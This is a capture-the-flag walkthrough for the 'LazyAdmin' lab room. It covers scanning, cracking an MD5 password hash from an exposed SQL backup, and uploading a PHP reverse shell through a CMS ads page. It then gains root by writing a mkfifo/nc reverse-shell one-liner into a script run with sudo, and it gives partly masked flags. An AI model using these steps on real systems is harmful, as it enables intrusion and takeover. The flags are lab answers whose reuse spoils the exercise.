# LazyAdmin

Have some fun! There might be multiple ways to get user access.

- What is the user flag?

	- `nmap -sV -sC <TARGET_IP>`. There are two services exposed: 22/tcp (ssh) and 1583/tcp (simbaexpress)
	- `nmap --script=vuln <TARGET_IP>`
	-		Nmap scan report for 10.10.58.33
			Host is up (0.081s latency).
			Not shown: 998 closed ports
			PORT   STATE SERVICE
			22/tcp open  ssh
			80/tcp open  http
			|_http-csrf: Couldn't find any CSRF vulnerabilities.
			|_http-dombased-xss: Couldn't find any DOM based XSS.
			| http-enum: 
			|_  /content/: Potentially interesting folder
			| http-slowloris-check: 
			|   VULNERABLE:
			|   Slowloris DOS attack
			|     State: LIKELY VULNERABLE
			|     IDs:  CVE:CVE-2007-6750
			|       Slowloris tries to keep many connections to the target web server open and hold
			|       them open as long as possible.  It accomplishes this by opening connections to
			|       the target web server and sending a partial request. By doing so, it starves
			|       the http server's resources causing Denial Of Service.
			|       
			|     Disclosure date: 2009-09-17
			|     References:
			|       http://ha.ckers.org/slowloris/
			|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
			|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
			
		Seems good.
	- Visit `http://<TARGET_IP>/content/` on browser.
	- `gobuster dir -u http://<TARGET_IP>/content/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
	-	 	/images (Status: 301)
			/js (Status: 301)
			/inc (Status: 301)
			/as (Status: 301)
			/_themes (Status: 301)
			/attachment (Status: 301)
			
		Interesting...
	- In `http://<TARGET_IP>/content/inc` there is  `mysql\_backup` folder. Download the .sql file inside.
	- Open it with or something similar. You should read a line with a passwd header and the a hashed value.
	- Use `hash-identifier` to detect the type of the hash. MD5. ok.
	- `cat <HASH_HERE> > hash.txt`
	- `sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-MD5`
	- Go into the login page `http://<TARGET_IP>/content/as/`
	- Login with the username inside the .sql file and the cracked password.
	- Go into `Ads` section.
	- Load the `rshell.php` into the content manager (change the IP address with yours!)
	- `nc -lvnp 1234` on your machine.
	- Go into `http://<TARGET_IP>/content/inc/ads` and click on the file you've just uploaded.
	- You gained a shell. `cd /home/itguy && cat user.txt`
	- `THM{63**bce92******ad111**********07}`

- What is the root flag?

	- `sudo -l`
	- Ok. We don't need sudo password for backup.pl and perl.
	- Analyze backup.pl, it runs /etc/copy.sh. Let'see.
	- It's a reverse shell. Change the specified ip address to yours.
	- `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP_HERE> 5554 >/tmp/f" > /etc/copy.sh`
	- `nc -lnvp 5554` on your machine
	- `sudo /usr/bin/perl /home/itguy/backup.pl` on target machine.
	- `cat /root/root.txt`
	- `THM{663**41d01******7cb**********99f}`
